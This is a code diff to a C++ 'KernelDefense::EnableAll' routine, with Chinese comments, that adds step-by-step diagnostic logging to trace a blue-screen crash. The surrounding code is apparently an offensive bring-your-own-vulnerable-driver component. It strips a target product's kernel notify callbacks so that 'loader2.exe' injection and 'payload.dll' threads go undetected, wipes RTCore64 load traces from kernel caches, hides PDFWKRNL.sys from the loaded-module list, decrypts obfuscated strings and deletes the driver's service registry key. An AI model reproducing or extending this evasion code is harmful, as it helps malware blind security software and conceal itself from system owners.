@@ -7498,14 +7498,20 @@ KernelDefense::Result KernelDefense::EnableAll() {
         WStringToString(pacNameW, pacNameA, 256);
         SecureZeroMemory(pacNameW, sizeof(pacNameW));
     }
+    // ★ BUILD 567 v3.292 DIAG: EnableAll 蓝屏定位 — 每步 StateLog (NDEBUG 下保留)
+    StateLog("BYOVD", "PreDisableOb", "");
     int pacOb = cbDisabler.DisableObCallbacks(pacNameA);
+    StateLog("BYOVD", "PostDisableOb", "ob=%d", pacOb);
     int pacProc = cbDisabler.DisableProcessNotifyCallbacks(pacNameA);
+    StateLog("BYOVD", "PostDisableProc", "proc=%d", pacProc);
     int pacImg = cbDisabler.DisableImageNotifyCallbacks(pacNameA);
+    StateLog("BYOVD", "PostDisableImg", "img=%d", pacImg);
     // ★ BUILD 554 P0-2: 启动期立即摘除线程通知回调 (修复 A2 缺陷)
     //   原 EnableAll 漏掉 DisableThreadNotifyCallbacks, 仅 DisableAll (ReapplyAllCallbacks)
     //   包含此项 — 导致启动期 60-90s 窗口内 PAC PsSetCreateThreadNotifyRoutine 仍激活,
     //   loader2.exe 注入 / payload.dll 内 CreateThread 调用会被 PAC 捕获.
     int pacThread = cbDisabler.DisableThreadNotifyCallbacks(pacNameA);
+    StateLog("BYOVD", "PostDisableThread", "thread=%d", pacThread);
     if (pacOb || pacProc || pacImg || pacThread) {
         ByovdDiag("BYOVD: callbacks removed (tgt/%s) — ob=%d proc=%d img=%d thread=%d\n",
             pacNameA, pacOb, pacProc, pacImg, pacThread);
@@ -7529,7 +7535,9 @@ KernelDefense::Result KernelDefense::EnableAll() {
 
     // ★ v3.126m: 清理内核驱动痕迹 (MmUnloadedDrivers / PiDDBCacheTable / CiHashBucket)
     //   在所有防御启用后, 最后由 BYOVD 内核 R/W 清理 RTCore64 加载/卸载痕迹
+    StateLog("BYOVD", "PreCleanTraces", "");
     KernelTraceCleaner::CleanAllTraces();
+    StateLog("BYOVD", "PostCleanTraces", "");
 
     // ★ BUILD 564 (v3.223): 从 PsLoadedModuleList 链表摘除 PDFWKRNL.sys 条目
     //   原因: PDFWKRNL.sys 通过 NtLoadDriver 加载后, 其 LDR_DATA_TABLE_ENTRY
@@ -7546,7 +7554,9 @@ KernelDefense::Result KernelDefense::EnableAll() {
     if (result.driverLoaded) {
         wchar_t pdfwSysName[32] = {};
         STEALTH_WSTR_DECRYPT_TO("PDFWKRNL.sys", pdfwSysName, 32);
+        StateLog("BYOVD", "PreHideDriver", "");
         bool pdfwHidden = PsLoadedModuleHider::Instance().HideDriver(pdfwSysName);
+        StateLog("BYOVD", "PostHideDriver", "ok=%d", pdfwHidden ? 1 : 0);
         ByovdDiag("B564:EnableAll: PDFWKRNL.sys hidden from PsLoadedModuleList = %d\n",
             pdfwHidden ? 1 : 0);
         SecureZeroMemory(pdfwSysName, sizeof(pdfwSysName));
@@ -7567,12 +7577,15 @@ KernelDefense::Result KernelDefense::EnableAll() {
             wchar_t keyPath[512] = {};
             wcscpy_s(keyPath, L"SYSTEM\\CurrentControlSet\\Services\\");
             wcscat_s(keyPath, svcName);
+            StateLog("BYOVD", "PreDelSCM", "");
             LONG delRes = RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath);
+            StateLog("BYOVD", "PostDelSCM", "res=%d", (int)delRes);
             ByovdDiag("BYOVD: SCM service entry '%ls' deleted (res=%d)\n",
                 svcName, (int)delRes);
         }
     }
 
+    StateLog("BYOVD", "EnableAll_DONE", "");
     return result;
 }
 
